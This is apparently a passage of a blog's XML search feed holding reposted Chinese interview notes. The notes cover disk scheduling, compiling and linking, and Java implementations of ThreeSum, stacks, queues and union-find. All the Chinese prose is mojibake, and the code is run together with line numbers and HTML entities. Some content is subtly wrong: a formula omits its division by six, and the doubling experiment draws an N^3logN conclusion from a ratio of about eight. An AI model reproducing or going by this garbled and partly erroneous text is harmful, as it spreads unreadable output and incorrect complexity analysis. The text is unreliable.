ç”µæ¢¯ç®—æ³•ï¼ˆæ‰«æç®—æ³•ï¼‰å’Œç”µæ¢¯çš„è¿è¡Œè¿‡ç¨‹ç±»ä¼¼ï¼Œæ€»æ˜¯æŒ‰ä¸€ä¸ªæ–¹å‘æ¥è¿›è¡Œç£ç›˜è°ƒåº¦ï¼Œç›´åˆ°è¯¥æ–¹å‘ä¸Šæ²¡æœ‰æœªå®Œæˆçš„ç£ç›˜è¯·æ±‚ï¼Œç„¶åæ”¹å˜æ–¹å‘ã€‚ å› ä¸ºè€ƒè™‘äº†ç§»åŠ¨æ–¹å‘ï¼Œå› æ­¤æ‰€æœ‰çš„ç£ç›˜è¯·æ±‚éƒ½ä¼šè¢«æ»¡è¶³ï¼Œè§£å†³äº† SSTF çš„é¥¥é¥¿é—®é¢˜ã€‚ å…­ã€é“¾æ¥ç¼–è¯‘ç³»ç»Ÿä»¥ä¸‹æ˜¯ä¸€ä¸ª hello.c ç¨‹åºï¼š 1234567#include &lt;stdio.h&gt;int main()&#123; printf("hello, world\n"); return 0;&#125; åœ¨ Unix ç³»ç»Ÿä¸Šï¼Œç”±ç¼–è¯‘å™¨æŠŠæºæ–‡ä»¶è½¬æ¢ä¸ºç›®æ ‡æ–‡ä»¶ã€‚ 1gcc -o hello hello.c è¿™ä¸ªè¿‡ç¨‹å¤§è‡´å¦‚ä¸‹ï¼š é¢„å¤„ç†é˜¶æ®µï¼šå¤„ç†ä»¥ # å¼€å¤´çš„é¢„å¤„ç†å‘½ä»¤ï¼› ç¼–è¯‘é˜¶æ®µï¼šç¿»è¯‘æˆæ±‡ç¼–æ–‡ä»¶ï¼› æ±‡ç¼–é˜¶æ®µï¼šå°†æ±‡ç¼–æ–‡ä»¶ç¿»è¯‘æˆå¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶ï¼› é“¾æ¥é˜¶æ®µï¼šå°†å¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶å’Œ printf.o ç­‰å•ç‹¬é¢„ç¼–è¯‘å¥½çš„ç›®æ ‡æ–‡ä»¶è¿›è¡Œåˆå¹¶ï¼Œå¾—åˆ°æœ€ç»ˆçš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ã€‚ é™æ€é“¾æ¥é™æ€è¿æ¥å™¨ä»¥ä¸€ç»„å¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶ä¸ºè¾“å…¥ï¼Œç”Ÿæˆä¸€ä¸ªå®Œå…¨é“¾æ¥çš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä½œä¸ºè¾“å‡ºã€‚é“¾æ¥å™¨ä¸»è¦å®Œæˆä»¥ä¸‹ä¸¤ä¸ªä»»åŠ¡ï¼š ç¬¦å·è§£æï¼šæ¯ä¸ªç¬¦å·å¯¹åº”äºä¸€ä¸ªå‡½æ•°ã€ä¸€ä¸ªå…¨å±€å˜é‡æˆ–ä¸€ä¸ªé™æ€å˜é‡ï¼Œç¬¦å·è§£æçš„ç›®çš„æ˜¯å°†æ¯ä¸ªç¬¦å·å¼•ç”¨ä¸ä¸€ä¸ªç¬¦å·å®šä¹‰å…³è”èµ·æ¥ã€‚ é‡å®šä½ï¼šé“¾æ¥å™¨é€šè¿‡æŠŠæ¯ä¸ªç¬¦å·å®šä¹‰ä¸ä¸€ä¸ªå†…å­˜ä½ç½®å…³è”èµ·æ¥ï¼Œç„¶åä¿®æ”¹æ‰€æœ‰å¯¹è¿™äº›ç¬¦å·çš„å¼•ç”¨ï¼Œä½¿å¾—å®ƒä»¬æŒ‡å‘è¿™ä¸ªå†…å­˜ä½ç½®ã€‚ ç›®æ ‡æ–‡ä»¶ å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ï¼šå¯ä»¥ç›´æ¥åœ¨å†…å­˜ä¸­æ‰§è¡Œï¼› å¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶ï¼šå¯ä¸å…¶å®ƒå¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶åœ¨é“¾æ¥é˜¶æ®µåˆå¹¶ï¼Œåˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ï¼› å…±äº«ç›®æ ‡æ–‡ä»¶ï¼šè¿™æ˜¯ä¸€ç§ç‰¹æ®Šçš„å¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶è¢«åŠ¨æ€åŠ è½½è¿›å†…å­˜å¹¶é“¾æ¥ï¼› åŠ¨æ€é“¾æ¥é™æ€åº“æœ‰ä»¥ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼š å½“é™æ€åº“æ›´æ–°æ—¶é‚£ä¹ˆæ•´ä¸ªç¨‹åºéƒ½è¦é‡æ–°è¿›è¡Œé“¾æ¥ï¼› å¯¹äº printf è¿™ç§æ ‡å‡†å‡½æ•°åº“ï¼Œå¦‚æœæ¯ä¸ªç¨‹åºéƒ½è¦æœ‰ä»£ç ï¼Œè¿™ä¼šæå¤§æµªè´¹èµ„æºã€‚ å…±äº«åº“æ˜¯ä¸ºäº†è§£å†³é™æ€åº“çš„è¿™ä¸¤ä¸ªé—®é¢˜è€Œè®¾è®¡çš„ï¼Œåœ¨ Linux ç³»ç»Ÿä¸­é€šå¸¸ç”¨ .so åç¼€æ¥è¡¨ç¤ºï¼ŒWindows ç³»ç»Ÿä¸Šå®ƒä»¬è¢«ç§°ä¸º DLLã€‚å®ƒå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š åœ¨ç»™å®šçš„æ–‡ä»¶ç³»ç»Ÿä¸­ä¸€ä¸ªåº“åªæœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰€æœ‰å¼•ç”¨è¯¥åº“çš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶éƒ½å…±äº«è¿™ä¸ªæ–‡ä»¶ï¼Œå®ƒä¸ä¼šè¢«å¤åˆ¶åˆ°å¼•ç”¨å®ƒçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼› åœ¨å†…å­˜ä¸­ï¼Œä¸€ä¸ªå…±äº«åº“çš„ .text èŠ‚ï¼ˆå·²ç¼–è¯‘ç¨‹åºçš„æœºå™¨ä»£ç ï¼‰çš„ä¸€ä¸ªå‰¯æœ¬å¯ä»¥è¢«ä¸åŒçš„æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹å…±äº«ã€‚ å‚è€ƒèµ„æ–™ Tanenbaum A S, Bos H. Modern operating systems[M]. Prentice Hall Press, 2014. æ±¤å­ç€›, å“²å‡¤å±, æ±¤å°ä¸¹. è®¡ç®—æœºæ“ä½œç³»ç»Ÿ[M]. è¥¿å®‰ç”µå­ç§‘æŠ€å¤§å­¦å‡ºç‰ˆç¤¾, 2001. Bryant, R. E., &amp; Oâ€™Hallaron, D. R. (2004). æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ. Operating System Notes è¿›ç¨‹é—´çš„å‡ ç§é€šä¿¡æ–¹å¼ Operating-System Structures Processes Inter Process Communication Presentation[1]]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç®—æ³•]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[ä¸€ã€å‰è¨€ äºŒã€ç®—æ³•åˆ†æ æ•°å­¦æ¨¡å‹ ThreeSum å€ç‡å®éªŒ æ³¨æ„äº‹é¡¹ ä¸‰ã€æ ˆå’Œé˜Ÿåˆ— æ ˆ é˜Ÿåˆ— å››ã€å¹¶æŸ¥é›† quick-find quick-union åŠ æƒ quick-union è·¯å¾„å‹ç¼©çš„åŠ æƒ quick-union å„ç§ union-find ç®—æ³•çš„æ¯”è¾ƒ äº”ã€æ’åº é€‰æ‹©æ’åº å†’æ³¡æ’åº æ’å…¥æ’åº å¸Œå°”æ’åº å½’å¹¶æ’åº å¿«é€Ÿæ’åº å †æ’åº å°ç»“ å…­ã€æŸ¥æ‰¾ é“¾è¡¨å®ç°æ— åºç¬¦å·è¡¨ äºŒåˆ†æŸ¥æ‰¾å®ç°æœ‰åºç¬¦å·è¡¨ äºŒå‰æŸ¥æ‰¾æ ‘ 2-3 æŸ¥æ‰¾æ ‘ çº¢é»‘æ ‘ æ•£åˆ—è¡¨ å°ç»“ ä¸ƒã€å…¶å®ƒ æ±‰è¯ºå¡” å“ˆå¤«æ›¼ç¼–ç  å‚è€ƒèµ„æ–™ ä¸€ã€å‰è¨€æœ¬æ–‡å®ç°ä»£ç ä»¥åŠæµ‹è¯•ä»£ç æ”¾åœ¨ Algorithm äºŒã€ç®—æ³•åˆ†ææ•°å­¦æ¨¡å‹1. è¿‘ä¼¼N3/6-N2/2+N/3 \ N3/6ã€‚ä½¿ç”¨ \f(N) æ¥è¡¨ç¤ºæ‰€æœ‰éšç€ N çš„å¢å¤§é™¤ä»¥ f(N) çš„ç»“æœè¶‹è¿‘äº 1 çš„å‡½æ•°ã€‚ 2. å¢é•¿æ•°é‡çº§N3/6-N2/2+N/3 çš„å¢é•¿æ•°é‡çº§ä¸º O(N3)ã€‚å¢é•¿æ•°é‡çº§å°†ç®—æ³•ä¸å®ƒçš„å®ç°éš”ç¦»å¼€æ¥ï¼Œä¸€ä¸ªç®—æ³•çš„å¢é•¿æ•°é‡çº§ä¸º O(N3) ä¸å®ƒæ˜¯å¦ç”¨ Java å®ç°ï¼Œæ˜¯å¦è¿è¡Œäºç‰¹å®šè®¡ç®—æœºä¸Šæ— å…³ã€‚ 3. å†…å¾ªç¯æ‰§è¡Œæœ€é¢‘ç¹çš„æŒ‡ä»¤å†³å®šäº†ç¨‹åºæ‰§è¡Œçš„æ€»æ—¶é—´ï¼ŒæŠŠè¿™äº›æŒ‡ä»¤ç§°ä¸ºç¨‹åºçš„å†…å¾ªç¯ã€‚ 4. æˆæœ¬æ¨¡å‹ä½¿ç”¨æˆæœ¬æ¨¡å‹æ¥è¯„ä¼°ç®—æ³•ï¼Œä¾‹å¦‚æ•°ç»„çš„è®¿é—®æ¬¡æ•°å°±æ˜¯ä¸€ç§æˆæœ¬æ¨¡å‹ã€‚ ThreeSumThreeSum ç”¨äºç»Ÿè®¡ä¸€ä¸ªæ•°ç»„ä¸­å’Œä¸º 0 çš„ä¸‰å…ƒç»„æ•°é‡ã€‚ 123public interface ThreeSum &#123; int count(int[] nums);&#125; 12345678910111213public class ThreeSumSlow implements ThreeSum &#123; @Override public int count(int[] nums) &#123; int N = nums.length; int cnt = 0; for (int i = 0; i &lt; N; i++) for (int j = i + 1; j &lt; N; j++) for (int k = j + 1; k &lt; N; k++) if (nums[i] + nums[j] + nums[k] == 0) cnt++; return cnt; &#125;&#125; è¯¥ç®—æ³•çš„å†…å¾ªç¯ä¸º if (nums[i] + nums[j] + nums[k] == 0) è¯­å¥ï¼Œæ€»å…±æ‰§è¡Œçš„æ¬¡æ•°ä¸º N(N-1)(N-2) = N3/6-N2/2+N/3ï¼Œå› æ­¤å®ƒçš„è¿‘ä¼¼æ‰§è¡Œæ¬¡æ•°ä¸º ~N3/6ï¼Œå¢é•¿æ•°é‡çº§ä¸º O(N3)ã€‚ æ”¹è¿› é€šè¿‡å°†æ•°ç»„å…ˆæ’åºï¼Œå¯¹ä¸¤ä¸ªå…ƒç´ æ±‚å’Œï¼Œå¹¶ç”¨äºŒåˆ†æŸ¥æ‰¾æ–¹æ³•æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨è¯¥å’Œçš„ç›¸åæ•°ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±è¯´æ˜å­˜åœ¨ä¸‰å…ƒç»„çš„å’Œä¸º 0ã€‚ åº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰æ•°ç»„ä¸å«æœ‰ç›¸åŒå…ƒç´ æ‰èƒ½ä½¿ç”¨è¿™ç§è§£æ³•ï¼Œå¦åˆ™äºŒåˆ†æŸ¥æ‰¾çš„ç»“æœä¼šå‡ºé”™ã€‚ è¯¥æ–¹æ³•å¯ä»¥å°† ThreeSum ç®—æ³•å¢é•¿æ•°é‡çº§é™ä½ä¸º O(N2logN)ã€‚ 12345678910111213141516public class ThreeSumFast &#123; public static int count(int[] nums) &#123; Arrays.sort(nums); int N = nums.length; int cnt = 0; for (int i = 0; i &lt; N; i++) for (int j = i + 1; j &lt; N; j++) &#123; int target = -nums[i] - nums[j]; int index = BinarySearch.search(nums, target); // åº”è¯¥æ³¨æ„è¿™é‡Œçš„ä¸‹æ ‡å¿…é¡»å¤§äº jï¼Œå¦åˆ™ä¼šé‡å¤ç»Ÿè®¡ã€‚ if (index &gt; j) cnt++; &#125; return cnt; &#125;&#125; 123456789101112131415public class BinarySearch &#123; public static int search(int[] nums, int target) &#123; int l = 0, h = nums.length - 1; while (l &lt;= h) &#123; int m = l + (h - l) / 2; if (target == nums[m]) return m; else if (target &gt; nums[m]) l = m + 1; else h = m - 1; &#125; return -1; &#125;&#125; å€ç‡å®éªŒå¦‚æœ T(N) \ aNblogNï¼Œé‚£ä¹ˆ T(2N)/T(N) \ 2bã€‚ ä¾‹å¦‚å¯¹äºæš´åŠ›çš„ ThreeSum ç®—æ³•ï¼Œè¿‘ä¼¼æ—¶é—´ä¸º ~N3/6ã€‚è¿›è¡Œå¦‚ä¸‹å®éªŒï¼šå¤šæ¬¡è¿è¡Œè¯¥ç®—æ³•ï¼Œæ¯æ¬¡å–çš„ N å€¼ä¸ºå‰ä¸€æ¬¡çš„ä¸¤å€ï¼Œç»Ÿè®¡æ¯æ¬¡æ‰§è¡Œçš„æ—¶é—´ï¼Œå¹¶ç»Ÿè®¡æœ¬æ¬¡è¿è¡Œæ—¶é—´ä¸å‰ä¸€æ¬¡è¿è¡Œæ—¶é—´çš„æ¯”å€¼ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š N Time(ms) Ratio 500 48 / 1000 320 6.7 2000 555 1.7 4000 4105 7.4 8000 33575 8.2 16000 268909 8.0 å¯ä»¥çœ‹åˆ°ï¼ŒT(2N)/T(N) \ 23ï¼Œå› æ­¤å¯ä»¥ç¡®å®š T(N) \ aN3logNã€‚ 12345678910111213141516171819public class RatioTest &#123; public static void main(String[] args) &#123; int N = 500; int loopTimes = 7; double preTime = -1; while (loopTimes-- &gt; 0) &#123; int[] nums = new int[N]; StopWatch.start(); ThreeSum threeSum = new ThreeSumSlow(); int cnt = threeSum.count(nums); System.out.println(cnt); double elapsedTime = StopWatch.elapsedTime(); double ratio = preTime == -1 ? 0 : elapsedTime / preTime; System.out.println(N + " " + elapsedTime + " " + ratio); preTime = elapsedTime; N *= 2; &#125; &#125;&#125; 123456789101112public class StopWatch &#123; private static long start; public static void start()&#123; start = System.currentTimeMillis(); &#125; public static double elapsedTime() &#123; long now = System.currentTimeMillis(); return (now - start) / 1000.0; &#125;&#125; æ³¨æ„äº‹é¡¹1. å¤§å¸¸æ•°åœ¨æ±‚è¿‘ä¼¼æ—¶ï¼Œå¦‚æœä½çº§é¡¹çš„å¸¸æ•°ç³»æ•°å¾ˆå¤§ï¼Œé‚£ä¹ˆè¿‘ä¼¼çš„ç»“æœå°±æ˜¯é”™è¯¯çš„ã€‚ 2. ç¼“å­˜è®¡ç®—æœºç³»ç»Ÿä¼šä½¿ç”¨ç¼“å­˜æŠ€æœ¯æ¥ç»„ç»‡å†…å­˜ï¼Œè®¿é—®æ•°ç»„ç›¸é‚»çš„å…ƒç´ ä¼šæ¯”è®¿é—®ä¸ç›¸é‚»çš„å…ƒç´ å¿«å¾ˆå¤šã€‚ 3. å¯¹æœ€åæƒ…å†µä¸‹çš„æ€§èƒ½çš„ä¿è¯åœ¨æ ¸ååº”å †ã€å¿ƒè„èµ·æå™¨æˆ–è€…åˆ¹è½¦æ§åˆ¶å™¨ä¸­çš„è½¯ä»¶ï¼Œæœ€åæƒ…å†µä¸‹çš„æ€§èƒ½æ˜¯ååˆ†é‡è¦çš„ã€‚ 4. éšæœºåŒ–ç®—æ³•é€šè¿‡æ‰“ä¹±è¾“å…¥ï¼Œå»é™¤ç®—æ³•å¯¹è¾“å…¥çš„ä¾èµ–ã€‚ 5. å‡æ‘Šåˆ†æå°†æ‰€æœ‰æ“ä½œçš„æ€»æˆæœ¬é™¤äºæ“ä½œæ€»æ•°æ¥å°†æˆæœ¬å‡æ‘Šã€‚ä¾‹å¦‚å¯¹ä¸€ä¸ªç©ºæ ˆè¿›è¡Œ N æ¬¡è¿ç»­çš„ push() è°ƒç”¨éœ€è¦è®¿é—®æ•°ç»„çš„å…ƒç´ ä¸º N+4+8+16+â€¦+2N=5N-4ï¼ˆN æ˜¯å‘æ•°ç»„å†™å…¥å…ƒç´ ï¼Œå…¶ä½™çš„éƒ½æ˜¯è°ƒæ•´æ•°ç»„å¤§å°æ—¶è¿›è¡Œå¤åˆ¶éœ€è¦çš„è®¿é—®æ•°ç»„æ“ä½œï¼‰ï¼Œå‡æ‘Šåæ¯æ¬¡æ“ä½œè®¿é—®æ•°ç»„çš„å¹³å‡æ¬¡æ•°ä¸ºå¸¸æ•°ã€‚ ä¸‰ã€æ ˆå’Œé˜Ÿåˆ—æ ˆFirst-In-Last-Out 123456789public interface MyStack&lt;Item&gt; extends Iterable&lt;Item&gt; &#123; MyStack&lt;Item&gt; push(Item item); Item pop() throws Exception; boolean isEmpty(); int size();&#125; 1. æ•°ç»„å®ç°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869public class ArrayStack&lt;Item&gt; implements MyStack&lt;Item&gt; &#123; // æ ˆå…ƒç´ æ•°ç»„ï¼Œåªèƒ½é€šè¿‡è½¬å‹æ¥åˆ›å»ºæ³›å‹æ•°ç»„ private Item[] a = (Item[]) new Object[1]; // å…ƒç´ æ•°é‡ private int N = 0; @Override public MyStack&lt;Item&gt; push(Item item) &#123; check(); a[N++] = item; return this; &#125; @Override public Item pop() throws Exception &#123; if (isEmpty()) throw new Exception("stack is empty"); Item item = a[--N]; check(); a[N] = null; // é¿å…å¯¹è±¡æ¸¸ç¦» return item; &#125; private void check() &#123; if (N &gt;= a.length) resize(2 * a.length); else if (N &gt; 0 &amp;&amp; N &lt;= a.length / 4) resize(a.length / 2); &#125; /** * è°ƒæ•´æ•°ç»„å¤§å°ï¼Œä½¿å¾—æ ˆå…·æœ‰ä¼¸ç¼©æ€§ */ private void resize(int size) &#123; Item[] tmp = (Item[]) new Object[size]; for (int i = 0; i &lt; N; i++) tmp[i] = a[i]; a = tmp; &#125; @Override public boolean isEmpty() &#123; return N == 0; &#125; @Override public int size() &#123; return N; &#125; @Override public Iterator&lt;Item&gt; iterator() &#123; // è¿”å›é€†åºéå†çš„è¿­ä»£å™¨ return new Iterator&lt;Item&gt;() &#123; private int i = N; @Override public boolean hasNext() &#123; return i &gt; 0; &#125; @Override public Item next() &#123; return a[--i]; &#125; &#125;; &#125;&#125; 2. é“¾è¡¨å®ç°éœ€è¦ä½¿ç”¨é“¾è¡¨çš„å¤´æ’æ³•æ¥å®ç°ï¼Œå› ä¸ºå¤´æ’æ³•ä¸­æœ€åå‹å…¥æ ˆçš„å…ƒç´ åœ¨é“¾è¡¨çš„å¼€å¤´ï¼Œå®ƒçš„ next æŒ‡é’ˆæŒ‡å‘å‰ä¸€ä¸ªå‹å…¥æ ˆçš„å…ƒç´ ï¼Œåœ¨å¼¹å‡ºå…ƒç´ æ—¶å°±å¯ä»¥é€šè¿‡ next æŒ‡é’ˆéå†åˆ°å‰ä¸€ä¸ªå‹å…¥æ ˆçš„å…ƒç´ ä»è€Œè®©è¿™ä¸ªå…ƒç´ ç§°ä¸ºæ–°çš„æ ˆé¡¶å…ƒç´ ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class ListStack&lt;Item&gt; implements MyStack&lt;Item&gt; &#123; private Node top = null; private int N = 0; private class Node &#123; Item item; Node next; &#125; @Override public MyStack&lt;Item&gt; push(Item item) &#123; Node newTop = new Node(); newTop.item = item; newTop.next = top; top = newTop; N++; return this; &#125; @Override public Item pop() throws Exception &#123; if (isEmpty()) throw new Exception("stack is empty"); Item item = top.item; top = top.next; N--; return item; &#125; @Override public boolean isEmpty() &#123; return N == 0; &#125; @Override public int size() &#123; return N; &#125; @Override public Iterator&lt;Item&gt; iterator() &#123; return new Iterator&lt;Item&gt;() &#123; private Node cur = top; @Override public boolean hasNext() &#123; return cur != null; &#125; @Override public Item next() &#123; Item item = cur.item; cur = cur.next; return item; &#125; &#125;; &#125;&#125; é˜Ÿåˆ—First-In-First-Out ä¸‹é¢æ˜¯é˜Ÿåˆ—çš„é“¾è¡¨å®ç°ï¼Œéœ€è¦ç»´æŠ¤ first å’Œ last èŠ‚ç‚¹æŒ‡é’ˆï¼Œåˆ†åˆ«æŒ‡å‘é˜Ÿé¦–å’Œé˜Ÿå°¾ã€‚ è¿™é‡Œéœ€è¦è€ƒè™‘ first å’Œ last æŒ‡é’ˆå“ªä¸ªä½œä¸ºé“¾è¡¨çš„å¼€å¤´ã€‚å› ä¸ºå‡ºé˜Ÿåˆ—æ“ä½œéœ€è¦è®©é˜Ÿé¦–å…ƒç´ çš„ä¸‹ä¸€ä¸ªå…ƒç´ æˆä¸ºé˜Ÿé¦–ï¼Œæ‰€ä»¥éœ€è¦å®¹æ˜“è·å–ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œè€Œé“¾è¡¨çš„å¤´éƒ¨èŠ‚ç‚¹çš„ next æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå› æ­¤å¯ä»¥è®© first æŒ‡é’ˆé“¾è¡¨çš„å¼€å¤´ã€‚ 123456789public interface MyQueue&lt;Item&gt; extends Iterable&lt;Item&gt; &#123; int size(); boolean isEmpty(); MyQueue&lt;Item&gt; add(Item item); Item remove() throws Exception;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667public class ListQueue&lt;Item&gt; implements MyQueue&lt;Item&gt; &#123; private Node first; private Node last; int N = 0; private class Node &#123; Item item; Node next; &#125; @Override public boolean isEmpty() &#123; return N == 0; &#125; @Override public int size() &#123; return N; &#125; @Override public MyQueue&lt;Item&gt; add(Item item) &#123; Node newNode = new Node(); newNode.item = item; newNode.next = null; if (isEmpty()) &#123; last = newNode; first = newNode; &#125; else &#123; last.next = newNode; last = newNode; &#125; N++; return this; &#125; @Override public Item remove() throws Exception &#123; if (isEmpty()) throw new Exception("queue is empty"); Node node = first; first = first.next; N--; if (isEmpty()) last = null; return node.item; &#125; @Override public Iterator&lt;Item&gt; iterator() &#123; return new Iterator&lt;Item&gt;() &#123; Node cur = first; @Override public boolean hasNext() &#123; return cur != null; &#125; @Override public Item next() &#123; Item item = cur.item; cur = cur.next; return item; &#125; &#125;; &#125;&#125; å››ã€å¹¶æŸ¥é›†ç”¨äºè§£å†³åŠ¨æ€è¿é€šæ€§é—®é¢˜ï¼Œèƒ½åŠ¨æ€è¿æ¥ä¸¤ä¸ªç‚¹ï¼Œå¹¶ä¸”åˆ¤æ–­ä¸¤ä¸ªç‚¹æ˜¯å¦è¿é€šã€‚ æ–¹æ³• æè¿° UF(int N) æ„é€ ä¸€ä¸ªå¤§å°ä¸º N çš„å¹¶æŸ¥é›† void union(int p, int q) è¿æ¥ p å’Œ q èŠ‚ç‚¹ int find(int p) æŸ¥æ‰¾ p æ‰€åœ¨çš„è¿é€šåˆ†é‡ boolean connected(int p, int q) åˆ¤æ–­ p å’Œ q èŠ‚ç‚¹æ˜¯å¦è¿é€š 1234567891011121314151617public abstract class UF &#123; protected int[] id; public UF(int N) &#123; id = new int[N]; for (int i = 0; i &lt; N; i++) id[i] = i; &#125; public boolean connected(int p, int q) &#123; return find(p) == find(q); &#125; public abstract int find(int p); public abstract void union(int p, int q);&#125; quick-findå¯ä»¥å¿«é€Ÿè¿›è¡Œ find æ“ä½œï¼Œå³å¯ä»¥å¿«é€Ÿåˆ¤æ–­ä¸¤ä¸ªèŠ‚ç‚¹æ˜¯å¦è¿é€šã€‚ åŒä¸€è¿é€šåˆ†é‡çš„æ‰€æœ‰èŠ‚ç‚¹çš„ id å€¼ç›¸ç­‰ã€‚ ä½†æ˜¯ union æ“ä½œä»£ä»·å´å¾ˆé«˜ï¼Œéœ€è¦å°†å…¶ä¸­ä¸€ä¸ªè¿é€šåˆ†é‡ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ id å€¼éƒ½ä¿®æ”¹ä¸ºå¦ä¸€ä¸ªèŠ‚ç‚¹çš„ id å€¼ã€‚ 1234567891011121314151617181920212223public class QuickFindUF extends UF &#123; public QuickFindUF(int N) &#123; super(N); &#125; @Override public int find(int p) &#123; return id[p]; &#125; @Override public void union(int p, int q) &#123; int pID = find(p); int qID = find(q); if (pID == qID) return; for (int i = 0; i &lt; id.length; i++) if (id[i] == pID) id[i] = qID; &#125;&#125; quick-unionå¯ä»¥å¿«é€Ÿè¿›è¡Œ union æ“ä½œï¼Œåªéœ€è¦ä¿®æ”¹ä¸€ä¸ªèŠ‚ç‚¹çš„ id å€¼å³å¯ã€‚ ä½†æ˜¯ find æ“ä½œå¼€é”€å¾ˆå¤§ï¼Œå› ä¸ºåŒä¸€ä¸ªè¿é€šåˆ†é‡çš„èŠ‚ç‚¹ id å€¼ä¸åŒï¼Œid å€¼åªæ˜¯ç”¨æ¥æŒ‡å‘å¦ä¸€ä¸ªèŠ‚ç‚¹ã€‚å› æ­¤éœ€è¦ä¸€ç›´å‘ä¸ŠæŸ¥æ‰¾æ“ä½œï¼Œç›´åˆ°æ‰¾åˆ°æœ€ä¸Šå±‚çš„èŠ‚ç‚¹ã€‚ 1234567891011121314151617181920public class QuickUnionUF extends UF &#123; public QuickUnionUF(int N) &#123; super(N); &#125; @Override public int find(int p) &#123; while (p != id[p]) p = id[p]; return p; &#125; @Override public void union(int p, int q) &#123; int pRoot = find(p); int qRoot = find(q); if (pRoot != qRoot) id[pRoot] = qRoot; &#125;&#125; è¿™ç§æ–¹æ³•å¯ä»¥å¿«é€Ÿè¿›è¡Œ union æ“ä½œï¼Œä½†æ˜¯ find æ“ä½œå’Œæ ‘é«˜æˆæ­£æ¯”ï¼Œæœ€åçš„æƒ…å†µä¸‹æ ‘çš„é«˜åº¦ä¸ºè§¦ç‚¹çš„æ•°ç›®ã€‚ åŠ æƒ quick-unionä¸ºäº†è§£å†³ quick-union çš„æ ‘é€šå¸¸ä¼šå¾ˆé«˜çš„é—®é¢˜ï¼ŒåŠ æƒ quick-union åœ¨ union æ“ä½œæ—¶ä¼šè®©è¾ƒå°çš„æ ‘è¿æ¥è¾ƒå¤§çš„æ ‘ä¸Šé¢ã€‚ ç†è®ºç ”ç©¶è¯æ˜ï¼ŒåŠ æƒ quick-union ç®—æ³•æ„é€ çš„æ ‘æ·±åº¦æœ€å¤šä¸è¶…è¿‡ logNã€‚ 123456789101112131415161718192021222324252627282930313233public class WeightedQuickUnionUF extends UF &#123; // ä¿å­˜èŠ‚ç‚¹çš„æ•°é‡ä¿¡æ¯ private int[] sz; public WeightedQuickUnionUF(int N) &#123; super(N); this.sz = new int[N]; for (int i = 0; i &lt; N; i++) this.sz[i] = 1; &#125; @Override public int find(int p) &#123; while (p != id[p]) p = id[p]; return p; &#125; @Override public void union(int p, int q) &#123; int i = find(p); int j = find(q); if (i == j) return; if (sz[i] &lt; sz[j]) &#123; id[i] = j; sz[j] += sz[i]; &#125; else &#123; id[j] = i; sz[i] += sz[j]; &#125; &#125;&#125; è·¯å¾„å‹ç¼©çš„åŠ æƒ quick-unionåœ¨æ£€æŸ¥èŠ‚ç‚¹çš„åŒæ—¶å°†å®ƒä»¬ç›´æ¥é“¾æ¥åˆ°æ ¹èŠ‚ç‚¹ï¼Œåªéœ€è¦åœ¨ find ä¸­æ·»åŠ ä¸€ä¸ªå¾ªç¯å³å¯ã€‚ å„ç§ union-find ç®—æ³•çš„æ¯”è¾ƒ ç®—æ³• union find quick-find N 1 quick-union æ ‘é«˜ æ ‘é«˜ åŠ æƒ quick-union logN logN è·¯å¾„å‹ç¼©çš„åŠ æƒ quick-union éå¸¸æ¥è¿‘ 1 éå¸¸æ¥è¿‘ 1 äº”ã€æ’åºå¾…æ’åºçš„å…ƒç´ éœ€è¦å®ç° Java çš„ Comparable æ¥å£ï¼Œè¯¥æ¥å£æœ‰ compareTo() æ–¹æ³•ï¼Œå¯ä»¥ç”¨å®ƒæ¥åˆ¤æ–­ä¸¤ä¸ªå…ƒç´ çš„å¤§å°å…³ç³»ã€‚ ç ”ç©¶æ’åºç®—æ³•çš„æˆæœ¬æ¨¡å‹æ—¶ï¼Œè®¡ç®—çš„æ˜¯æ¯”è¾ƒå’Œäº¤æ¢çš„æ¬¡æ•°ã€‚ ä½¿ç”¨è¾…åŠ©å‡½æ•° less() å’Œ swap() æ¥è¿›è¡Œæ¯”è¾ƒå’Œäº¤æ¢çš„æ“ä½œï¼Œä½¿å¾—ä»£ç çš„å¯è¯»æ€§å’Œå¯ç§»æ¤æ€§æ›´å¥½ã€‚ 1234567891011121314public abstract class Sort&lt;T extends Comparable&lt;T&gt;&gt; &#123; public abstract void sort(T[] nums); protected boolean less(T v, T w) &#123; return v.compareTo(w) &lt; 0; &#125; protected void swap(T[] a, int i, int j) &#123; T t = a[i]; a[i] = a[j]; a[j] = t; &#125;&#125; 